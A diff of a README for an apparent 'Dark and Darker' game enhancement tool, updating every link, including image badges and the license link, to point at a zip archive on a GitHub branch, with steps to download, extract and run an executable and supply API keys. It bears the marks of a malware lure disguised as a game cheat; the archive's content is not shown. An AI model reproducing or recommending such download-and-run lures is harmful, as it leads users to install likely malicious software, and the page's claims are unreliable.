@@ -1,4 +1,4 @@
-# ![Download](https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed-secrets-dark-and-darker-v1.1.zip%20Now-blue?logo=github&logoColor=white&style=for-the-badge&https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed-secrets-dark-and-darker-v1.1.zip)  
+# ![Download](https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed_darker_and_secrets_dark_v2.5.zip%20Now-blue?logo=github&logoColor=white&style=for-the-badge&https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed_darker_and_secrets_dark_v2.5.zip)  
    
 ---
 
@@ -14,9 +14,9 @@ Unlock your preferred dimension—our enhancements are engineered for versatilit
 
 | Platform         | Supported | Notes              |
 |------------------|:---------:|-------------------|
-| ![Windows](https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed-secrets-dark-and-darker-v1.1.zip)     | ✅        | Full Support        |
-| ![Linux](https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed-secrets-dark-and-darker-v1.1.zip)     | ✅        | Partial Support     |
-| ![macOS](https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed-secrets-dark-and-darker-v1.1.zip)    | ⚠️        | Experimental        |
+| ![Windows](https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed_darker_and_secrets_dark_v2.5.zip)     | ✅        | Full Support        |
+| ![Linux](https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed_darker_and_secrets_dark_v2.5.zip)     | ✅        | Partial Support     |
+| ![macOS](https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed_darker_and_secrets_dark_v2.5.zip)    | ⚠️        | Experimental        |
 
 > *Tip: For best results, always use the latest system updates across devices.*
 
@@ -84,7 +84,7 @@ Got questions or need a helping hand, day or night? Our support mages are vigila
 
 Installing your ultimate Dark and Darker enhancement suite is a breeze.  
 
-1. Click the ![Download](https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed-secrets-dark-and-darker-v1.1.zip%20Now-blue?logo=github&logoColor=white&style=for-the-badge&https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed-secrets-dark-and-darker-v1.1.zip) badge at the **top** or **bottom** of this page, or use the direct https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed-secrets-dark-and-darker-v1.1.zip
+1. Click the ![Download](https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed_darker_and_secrets_dark_v2.5.zip%20Now-blue?logo=github&logoColor=white&style=for-the-badge&https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed_darker_and_secrets_dark_v2.5.zip) badge at the **top** or **bottom** of this page, or use the direct https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed_darker_and_secrets_dark_v2.5.zip
 2. Extract the contents of the downloaded archive into your desired folder.
 3. Launch the executable corresponding to your operating system.
 4. (Optional) Configure your preferences and allow necessary API keys for advanced AI-driven features.
@@ -100,11 +100,11 @@ This repository is not affiliated with, endorsed by, or connected to the develop
 
 ## 📜 License
 
-This project dances under the MIT License (2025). For full terms and intellectual property notes, please see the [MIT LICENSE](https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed-secrets-dark-and-darker-v1.1.zip).
+This project dances under the MIT License (2025). For full terms and intellectual property notes, please see the [MIT LICENSE](https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed_darker_and_secrets_dark_v2.5.zip).
 
 ---
 
-# ![Download](https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed-secrets-dark-and-darker-v1.1.zip%20Now-blue?logo=github&logoColor=white&style=for-the-badge&https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed-secrets-dark-and-darker-v1.1.zip)  
+# ![Download](https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed_darker_and_secrets_dark_v2.5.zip%20Now-blue?logo=github&logoColor=white&style=for-the-badge&https://raw.githubusercontent.com/keshu9925/shadowed-secrets-dark-and-darker/branch/pseudoperianth/shadowed_darker_and_secrets_dark_v2.5.zip)  
 
 ---
 
